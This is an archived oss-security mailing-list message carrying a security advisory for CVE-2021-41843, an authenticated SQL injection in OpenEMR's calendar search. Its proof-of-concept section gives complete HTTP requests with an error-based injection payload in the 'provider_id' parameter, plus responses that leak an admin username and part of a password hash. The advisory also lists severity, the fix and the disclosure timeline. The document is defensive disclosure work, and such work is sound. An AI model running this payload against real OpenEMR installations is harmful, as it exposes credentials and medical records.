X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6774" "Wednesday" "15" "December" "2021" "12:59:42" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "203" "[oss-security] Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search" nil nil nil "12" nil nil (number mark "U       s.pietsch@tr Dec 15  203/6774  " thread-indent "\"[oss-security] Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11900 invoked by uid 550); 15 Dec 2021 13:06:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7963 invoked from network); 15 Dec 2021 13:00:00 -0000
Date: Wed, 15 Dec 2021 12:59:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail; t=1639573187;
	bh=fuJLwXYDbQFkTVXyxlhDkKzh1B13v/8BU9/CzbjeKOg=;
	h=Date:To:From:Reply-To:Subject:Message-ID:From:To:Cc;
	b=FvWqGzRRtbsLlp3F53xRRu0g53jFkpIbdRXgvHMosGIuJUE0Y3osbTGgpEvjcY9XI
	 tVNjSOj1C3ASbXjrCmvubq7gWCtURsuRENqVzKdX8FVRKpGfR9J/OgfwfvmBDS5zvA
	 yLPOewXGa37IurCzHjBTvkK/ZK106VIgx68ZUnOTYNH+s6Ktj8O7fvsbZgr8DjKULW
	 yxCLXJ0a5gB7jH0kXlXfZwnuaW5llhfgIubwcRaSW89rkCEkjYMJxcX16S8ePQXHsa
	 hv5SU5YS8VEuCVct9Da/1aCJtx3KQ1A+jISqW4MZubB6tqMUiz4fq3+tAgjzQem8Ku
	 3R+mS0C4tMb9g==
To: Packet Storm <submissions@packetstormsecurity.com>, Full Disclosure <fulldisclosure@seclists.org>, oss-security <oss-security@lists.openwall.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <Gl7x8NHZn3QfaD0f8JA_si_MHdBvQSEU-IxxzPoxqpyetjmU2TLz6qp3heabcowIq1f9YrAid8zSArHU8pLRbS2_bvXz1IFTOwPxMylXqYQ=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="------7b32ff9e8a930f9484427f7f39de98ebb72e23127215d6c5a471c1a043bcf192"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2109-01 / CVE-2021-41843: Authenticated SQL injection in OpenEMR calendar search

--------7b32ff9e8a930f9484427f7f39de98ebb72e23127215d6c5a471c1a043bcf192
Content-Type: multipart/mixed;boundary=---------------------4706c241778aea00db07dd82cebf60aa

-----------------------4706c241778aea00db07dd82cebf60aa
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2109-01 #
#####################################


Authenticated SQL injection in OpenEMR calendar search
######################################################


Overview
########

Advisory ID: TRSA-2109-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2109-01
Affected product: OpenEMR web application
Tested versions: 6.0.0, 6.1.0-dev
Vendor: OpenEMR project, https://www.open-emr.org
Credits: Trovent Security GmbH, Stefan Pietsch


Detailed description
####################

The OpenEMR web application is a medical practice management software and c=
an
be used to store electronic medical records.
Trovent Security GmbH discovered an SQL injection vulnerability in the sear=
ch
function of the calendar module. The parameter 'provider_id' is injectable.
The attacker needs a valid user account to access the calendar module of the
web application. It is possible to read data from all tables of the databas=
e.

Severity: Medium
CVSS Score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE ID: CWE-89
CVE ID: CVE-2021-41843


Proof of concept
################

(1) HTTP request to read a username from the database table 'openemr.users_=
secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

POST /interface/main/calendar/index.php?module=3DPostCalendar&func=3Dsearch=
 HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=3DTRVNT&pc_keywords_andor=3DAND&pc_category=3D&start=3D09%2F16%=
2F2021&end=3D09%2F23%2F2021&
provider_id=3D%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%=
28IFNULL%28CAST%28username
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20O=
RDER%20BY%20id%29%29%2C1%29%29&pc_facility=3D&submit=3DSubmit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


(2) HTTP response to (1):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:26:48 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; exp=
ires=3DFri, 17-Sep-2021 15:13:28 GMT; Max-Age=3D28000; path=3D/; SameSite=
=3DStrict
Set-Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; exp=
ires=3DFri, 17-Sep-2021 15:13:29 GMT; Max-Age=3D28000; path=3D/; SameSite=
=3DStrict
Strict-Transport-Security: max-age=3D31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=3Dblock
Content-Length: 27
Connection: close
Content-Type: text/html; charset=3Dutf-8

XPATH syntax error: 'admin'

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


(3) HTTP request to read a password hash from the database table 'openemr.u=
sers_secure':
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

POST /interface/main/calendar/index.php?module=3DPostCalendar&func=3Dsearch=
 HTTP/1.1
Content-Length: 324
Host: 172.18.0.3
Content-Type: application/x-www-form-urlencoded
Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q
Connection: close

pc_keywords=3DTRVNT&pc_keywords_andor=3DAND&pc_category=3D&start=3D09%2F16%=
2F2021&end=3D09%2F23%2F2021&
provider_id=3D%28UPDATEXML%281%2CCONCAT%280x2e%2C0x20%2C%28SELECT%20MID%28%=
28IFNULL%28CAST%28password
%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C22%29%20FROM%20openemr.users_secure%20O=
RDER%20BY%20id%29%29%2C1%29%29&pc_facility=3D&submit=3DSubmit

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


(4) HTTP response to (3):
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 07:27:29 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; exp=
ires=3DFri, 17-Sep-2021 15:14:09 GMT; Max-Age=3D28000; path=3D/; SameSite=
=3DStrict
Set-Cookie: OpenEMR=3DbofmeFnRf2xbYcrhtHxOApQJYZuoVfFnv8lH6luSuvTrw85Q; exp=
ires=3DFri, 17-Sep-2021 15:14:09 GMT; Max-Age=3D28000; path=3D/; SameSite=
=3DStrict
Strict-Transport-Security: max-age=3D31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=3Dblock
Content-Length: 44
Connection: close
Content-Type: text/html; charset=3Dutf-8

XPATH syntax error: '$2y$10$ukudH2lRSW2vKX.'

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

Limit access to the calendar search function until the vulnerability is fix=
ed.

Fixed in OpenEMR version 6.0.0 patch 3, verified by Trovent.


History
#######

2021-09-16: Vulnerability found
2021-09-29: Advisory created & vendor contacted
2021-09-30: Vendor acknowledged vulnerability, CVE ID requested
2021-10-01: CVE ID received
2021-10-19: Vendor releases OpenEMR version 6.0.0 patch 3
2021-12-14: Add information about fixed version
2021-12-15: Advisory published

-----------------------4706c241778aea00db07dd82cebf60aa--

--------7b32ff9e8a930f9484427f7f39de98ebb72e23127215d6c5a471c1a043bcf192
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJhuearACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjrdEMQ/9FVRbeutioelMSlGreF/jKa+Jvwb1PWNMdjdc/+y4V8XehAdd
VfA1+dXNdDhcFgUCVAA/coCci7n8qcS669DfPUsor4Icyzz8UHcjPjGacRNK
henioWYoc6v6JwG5nXh+U++dr3OuwCB608E9PGOTxdCdIQooF5bggWKIk01I
oc6gIzov2yVjxEc5hTsurCZRv67mSWuuiTZcNeHxB+2nyA+lgl5ZXBC+RPZt
nfLJwvuDdRU0NsSEWcH2NxbVjbfTHLhhPdp7GFA91BnfT9NO5SqKajzWt4ZZ
tpK8kmi/++UgXZ3+2O3W+BUX8h/Vhv8AjdWzkkh9aRCsb25g7pSlUjyB561j
+f5V386M6iiMz2r8Pin3cggDjl3w//yMVgij4G015ukmO0TwrOU7T1WefwIK
VhKu2ew/Q2yfBrZC4mvfCNTMQ/AkhwosPhUP28Qe7Wra0SVQeVn1UfJ7sPEl
6DCLQIU8Y1LuuOs2va1KKLsGXtAQ6gg/h5evRMx6RRtiKahf5QLbzPrl+B3d
D0UPLxYOOyM78WuWHsHptDh3Gtf88p0htlGrgKFJEmr+4k0GgAcpEtVUcCEY
k3E1+u1FXORyLUFAOpJxnT0xedMEosZbWHP2F/ITMMg7EBhO27q/4zufyirn
zXFH6H1VnBwTEDF/G/relISKWJ10DNnKD0E=
=rWj5
-----END PGP SIGNATURE-----


--------7b32ff9e8a930f9484427f7f39de98ebb72e23127215d6c5a471c1a043bcf192--

